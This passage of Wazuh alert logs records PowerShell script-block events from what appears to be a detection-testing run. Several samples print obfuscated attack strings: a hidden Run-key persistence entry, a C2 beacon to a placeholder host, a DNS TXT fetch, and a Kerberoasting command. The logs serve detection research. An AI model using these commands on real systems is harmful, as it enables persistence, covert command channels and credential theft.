\"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:40.1557491Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:40.1557491Z\",\"eventRecordID\":\"722826\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-153'; Get-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 28b4c492-3489-41f7-a727-67a94f265339\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-153'; Get-ItemProperty -Path 'HKLM:\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"28b4c492-3489-41f7-a727-67a94f265339\"}}}","id":"1784281000.510222","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:40.855+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"09a8ef5e-560c-4475-92ae-5c4c006a6c81","scriptBlockText":"$sampleId='PST-154'; $encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722829","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-154'; $encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 09a8ef5e-560c-4475-92ae-5c4c006a6c81\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:40.4907339Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:40.4907339Z\",\"eventRecordID\":\"722829\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-154'; $encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 09a8ef5e-560c-4475-92ae-5c4c006a6c81\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-154'; $encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"09a8ef5e-560c-4475-92ae-5c4c006a6c81\"}}}","id":"1784281000.512812","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":15,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:40.881+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d4b92f06-89cd-41b4-a8db-74b1bfeed39c","scriptBlockText":"$sampleId='PST-155'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722833","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-155'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d4b92f06-89cd-41b4-a8db-74b1bfeed39c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:40.8217898Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:40.8217898Z\",\"eventRecordID\":\"722833\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-155'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d4b92f06-89cd-41b4-a8db-74b1bfeed39c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-155'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d4b92f06-89cd-41b4-a8db-74b1bfeed39c\"}}}","id":"1784281000.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:40.942+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3e7d8ee4-0a75-4df2-b82b-69853be83bc1","scriptBlockText":"$sampleId='PST-156'; $parts=@('New-ItemPropert','y -Path ''HKCU:\\\\So','ftware\\\\Microsof','t\\\\Windows\\\\C','urrentVersio','n\\\\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\\\\__T','HESIS_INERT__\\\\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722837","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-156'; $parts=@('New-ItemPropert','y -Path ''HKCU:\\So','ftware\\Microsof','t\\Windows\\C','urrentVersio','n\\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\\__T','HESIS_INERT__\\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3e7d8ee4-0a75-4df2-b82b-69853be83bc1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:41.2433468Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:41.2433468Z\",\"eventRecordID\":\"722837\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-156'; $parts=@('New-ItemPropert','y -Path ''HKCU:\\\\So','ftware\\\\Microsof','t\\\\Windows\\\\C','urrentVersio','n\\\\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\\\\__T','HESIS_INERT__\\\\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3e7d8ee4-0a75-4df2-b82b-69853be83bc1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-156'; $parts=@('New-ItemPropert','y -Path ''HKCU:\\\\\\\\So','ftware\\\\\\\\Microsof','t\\\\\\\\Windows\\\\\\\\C','urrentVersio','n\\\\\\\\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\\\\\\\\__T','HESIS_INERT__\\\\\\\\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3e7d8ee4-0a75-4df2-b82b-69853be83bc1\"}}}","id":"1784281001.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:41.869+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5ee090fb-1113-4ff4-a30a-9cfd2695ccaf","scriptBlockText":"$sampleId='PST-157'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722841","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-157'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5ee090fb-1113-4ff4-a30a-9cfd2695ccaf\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:41.5785174Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:41.5785174Z\",\"eventRecordID\":\"722841\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-157'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5ee090fb-1113-4ff4-a30a-9cfd2695ccaf\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-157'; Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 5 TaskName, State; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5ee090fb-1113-4ff4-a30a-9cfd2695ccaf\"}}}","id":"1784281001.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:41.877+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b7e68288-9e35-4dc0-ab7d-cd858de0c646","scriptBlockText":"$sampleId='PST-158'; Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722856","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-158'; Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b7e68288-9e35-4dc0-ab7d-cd858de0c646\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:42.2077583Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:42.2077583Z\",\"eventRecordID\":\"722856\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-158'; Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b7e68288-9e35-4dc0-ab7d-cd858de0c646\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-158'; Get-Culture | Select-Object Name, DisplayName; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b7e68288-9e35-4dc0-ab7d-cd858de0c646\"}}}","id":"1784281002.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:42.877+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2dcf05fb-5ec6-4365-bb8e-329dc2c63881","scriptBlockText":"$sampleId='PST-159'; $indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722858","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-159'; $indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2dcf05fb-5ec6-4365-bb8e-329dc2c63881\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:42.5353703Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:42.5353703Z\",\"eventRecordID\":\"722858\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-159'; $indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2dcf05fb-5ec6-4365-bb8e-329dc2c63881\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-159'; $indicator='Resolve-DnsName -Type TXT -Name ''task.examp`le.in`valid'' | Select-Obje`ct -Expa`ndP`roperty St`rings'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2dcf05fb-5ec6-4365-bb8e-329dc2c63881\"}}}","id":"1784281002.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:42.884+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f679d2f5-0a1a-4a43-976b-b939106b1c8f","scriptBlockText":"$sampleId='PST-160'; $indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722863","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-160'; $indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f679d2f5-0a1a-4a43-976b-b939106b1c8f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:42.8587736Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:42.8587736Z\",\"eventRecordID\":\"722863\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-160'; $indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f679d2f5-0a1a-4a43-976b-b939106b1c8f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-160'; $indicator='$PRoFIle=@{SLeeP=60000;jItter=0.25;USERAgeNT=''MozILlA/5.0'';UrI=''/API/v1/STaTuS''}; INVOKe-webRequest -URI ''httpS://c2.ExamPle.inValiD/ApI/v1/StAtUs'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f679d2f5-0a1a-4a43-976b-b939106b1c8f\"}}}","id":"1784281002.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:42.962+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce","scriptBlockText":"$sampleId='PST-161'; $parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722866","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-161'; $parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:43.1800189Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:43.1800189Z\",\"eventRecordID\":\"722866\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-161'; $parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-161'; $parts=@('INv`Oke-Ker','bERO`as','t -OuTpU','tFoR`m`aT ','HaSH`cA','t | SEL','ect-obJe','`ct sA','MAcCOu`ntN','`AmE,HASH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b72fa222-3b5f-4daa-9ad1-cc09be0fd7ce\"}}}","id":"1784281003.512812","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:43.968+0200"}
